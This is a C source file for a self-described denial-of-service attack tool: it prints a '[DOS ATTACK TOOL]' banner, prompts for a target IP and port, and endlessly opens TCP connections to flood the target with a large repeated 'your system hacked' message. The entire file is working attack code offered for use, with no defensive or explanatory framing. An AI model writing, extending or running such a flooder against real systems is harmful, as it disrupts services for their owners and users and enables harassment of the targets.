#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#define MESSAGE_REPEAT 1024

void clear_screen() {
    system("clear"); // use "cls" on Windows
}

void print_banner() {
    printf("██████╗  ██████╗ ███████╗\n");
    printf("██╔══██╗██╔═══██╗██╔════╝\n");
    printf("██████╔╝██║   ██║███████╗\n");
    printf("██╔═══╝ ██║   ██║╚════██║\n");
    printf("██║     ╚██████╔╝███████║\n");
    printf("╚═╝      ╚═════╝ ╚══════╝\n\n");
    printf("    [DOS ATTACK TOOL]\n\n");
}

int check_internet() {
    struct hostent *host = gethostbyname("google.com");
    return host == NULL;  // Return 1 if not reachable
}

void request(const char *ip, int port, const char *message) {
    int sock;
    struct sockaddr_in server;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    server.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        clear_screen();
        print_banner();
        perror("Connection error");
        close(sock);
        return;
    }

    send(sock, message, strlen(message), 0);
    close(sock);
}

void flood(const char *ip, int port, const char *message) {
    while (1) {
        request(ip, port, message);
    }
}

int main() {
    char ip[100];
    int port;

    if (check_internet()) {
        printf("\n<#DOS>\n>//Connecting...\n");
        sleep(1);
        printf("DOS.NetworkError: Network is not reachable, try again when possible ⚠\n");
        return 1;
    }

    clear_screen();
    print_banner();

    printf("\nTarget Gateway IP: ");
    scanf("%s", ip);

    printf("PORT: ");
    scanf("%d", &port);

    // Prepare large message
    char *message = malloc(MESSAGE_REPEAT * strlen("your system hacked") + 1);
    message[0] = '\0';
    for (int i = 0; i < MESSAGE_REPEAT; i++) {
        strcat(message, "your system hacked");
    }

    flood(ip, port, message);

    free(message);
    return 0;
}